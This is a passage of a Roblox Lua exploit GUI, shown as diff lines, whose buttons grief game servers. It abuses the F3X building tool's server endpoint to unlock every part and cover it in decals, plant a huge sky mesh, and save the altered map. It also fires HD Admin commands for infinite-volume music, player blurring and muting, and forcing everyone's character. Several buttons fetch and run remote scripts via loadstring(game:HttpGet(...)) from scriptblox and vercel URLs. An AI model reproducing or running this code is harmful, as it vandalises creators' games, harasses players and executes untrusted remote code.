+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 844208899")
+		RequestCommand:InvokeServer(";pitch 0.2")
+		RequestCommand:InvokeServer(";volume inf")
+	
+		wait(4.8)
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 133180219581309")
+		RequestCommand:InvokeServer(";pitch 0.09")
+		RequestCommand:InvokeServer(";volume inf")
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("120446277926674")
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 17")
+	
+		wait (1)
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"111891702759441")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(99999,99999,99999))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("120446277926674")
+	
+		wait (0.5)
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";fogcolor black")
+		RequestCommand:InvokeServer(";savemap")
+	end)
+end
+task.spawn(SCRIPT_42)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Pickle567421 gui f3x.LocalScript \\ --
+local function SCRIPT_44()
+local script = UI["44"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Pickle567421-gui-f3x-226632"))()
+	end)
+end
+task.spawn(SCRIPT_44)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Yellow2Spooky GUI F3X.LocalScript \\ --
+local function SCRIPT_46()
+local script = UI["46"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://voidedx.vercel.app/api/raw?id=vx_ba3ieaxp"))()
+	end)
+end
+task.spawn(SCRIPT_46)
+-- // StarterGui.ScreenGui.ImageLabel.Script.g00by665len gui f3x.LocalScript \\ --
+local function SCRIPT_49()
+local script = UI["49"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-g00by665len-gui-f3x-New-update-228268"))()
+	end)
+end
+task.spawn(SCRIPT_49)
+-- // StarterGui.ScreenGui.ImageLabel.Script.1x1x1x1 gui.LocalScript \\ --
+local function SCRIPT_4b()
+local script = UI["4b"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-1x1x1x1-F3X-GUI-Script-58801"))()
+	end)
+end
+task.spawn(SCRIPT_4b)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Realm gh00stkidd and yellow2spooky F3X.LocalScript \\ --
+local function SCRIPT_4d()
+local script = UI["4d"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-F3X-REALM-ghOOstkidd93-and-Yellow2Spooky-231197"))()
+	end)
+end
+task.spawn(SCRIPT_4d)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Char all.LocalScript \\ --
+local function SCRIPT_50()
+local script = UI["50"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";char all k00psin3745")
+	end)
+end
+task.spawn(SCRIPT_50)
+-- // StarterGui.ScreenGui.ImageLabel.Script.ANTI-SKID.LocalScript \\ --
+local function SCRIPT_52()
+local script = UI["52"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";blur all ;mute all")
+	end)
+end
+task.spawn(SCRIPT_52)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Fog.LocalScript \\ --
+local function SCRIPT_54()
+local script = UI["54"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";fog 100 0")
+	end)
+end
+task.spawn(SCRIPT_54)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Night.LocalScript \\ --
+local function SCRIPT_56()
+local script = UI["56"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 1")
+	end)
+end
+task.spawn(SCRIPT_56)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Shedletsky.LocalScript \\ --
+local function SCRIPT_58()
+local script = UI["58"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-f3x-shedletsky-230501"))()
+	end)
+end
+task.spawn(SCRIPT_58)
+-- // StarterGui.ScreenGui.ImageLabel.Script.polaria.LocalScript \\ --
+local function SCRIPT_5a()
+local script = UI["5a"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/F3X-Building-Tools-F3x-Polaria-226596"))()
+	end)
+end
+task.spawn(SCRIPT_5a)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Rotate Parts.LocalScript \\ --
+local function SCRIPT_5c()
+local script = UI["5c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Rotate-Parts-f3x-240243"))()
+	end)
+end
+task.spawn(SCRIPT_5c)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Swamp Madness.LocalScript \\ --
+local function SCRIPT_5e()
+local script = UI["5e"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Swamp-Madness-F3X-232196"))()
+	end)
+end
+task.spawn(SCRIPT_5e)
+-- // StarterGui.ScreenGui.ImageLabel.Script.job.LocalScript \\ --
+local function SCRIPT_60()
+local script = UI["60"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";music 139639579473440 ;volume inf")
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("137707964386564")
+	end)
+end
+task.spawn(SCRIPT_60)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_64()
+local script = UI["64"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 87174269808530 ;pitch 0.1 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_64)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_66()
+local script = UI["66"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 78446838708757 ;pitch 0.2 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_66)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_68()
+local script = UI["68"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 81704507776926 ;volume inf ;pitch 0.9")
+	end)
+end
+task.spawn(SCRIPT_68)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_6a()
+local script = UI["6a"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1846575559 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_6a)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_6c()
+local script = UI["6c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 127653283576622 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_6c)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_6e()
+local script = UI["6e"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 118540910592691 ;pitch 0.2 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_6e)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_70()
+local script = UI["70"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 97785416967035 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_70)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_72()
+local script = UI["72"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 73293994328169 ;volume inf ;pitch 0.1")
+	end)
+end
+task.spawn(SCRIPT_72)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_74()
+local script = UI["74"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 86412047196482 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_74)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_76()
+local script = UI["76"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 112626671704099 ;volume inf ;pitch 0.2")
+	end)
+end
+task.spawn(SCRIPT_76)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_78()
+local script = UI["78"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1839246711 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_78)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_7a()
+local script = UI["7a"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 95156028272944 ;volume inf ;pitch 0.2")
+	end)
+end
+task.spawn(SCRIPT_7a)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_7c()
+local script = UI["7c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 139488665764275 ;volume inf ;pitch 0.9")
+	end)
+end
+task.spawn(SCRIPT_7c)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_7e()
+local script = UI["7e"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 35930009 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_7e)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_80()
+local script = UI["80"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1839270925 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_80)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_82()
+local script = UI["82"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
